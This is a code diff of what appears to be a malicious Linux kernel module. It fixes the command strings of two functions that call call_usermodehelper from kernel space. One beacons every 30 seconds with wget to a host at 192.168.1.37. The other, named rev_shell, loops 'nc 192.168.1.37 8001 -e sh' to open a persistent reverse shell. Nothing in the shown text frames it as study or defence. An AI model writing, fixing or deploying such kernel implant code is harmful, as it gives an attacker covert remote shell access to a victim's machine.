@@ -41,7 +41,7 @@ void make_request(char *str) {
 
 //function to make a request every 30s
 void make_request_periodic(void) {
-	char *str = "staf\nwhile true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
+	char *str = "while true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
 	char *argv[] = {"/bin/sh", "-c", str, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
@@ -56,7 +56,7 @@ void kill_all_communications(void) {
 
 // initiate rev shell
 void rev_shell(void) {
-	char *shell = "staf\nwhile true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
+	char *shell = "while true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
 	char *argv[] = {"/bin/sh", "-c", shell, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
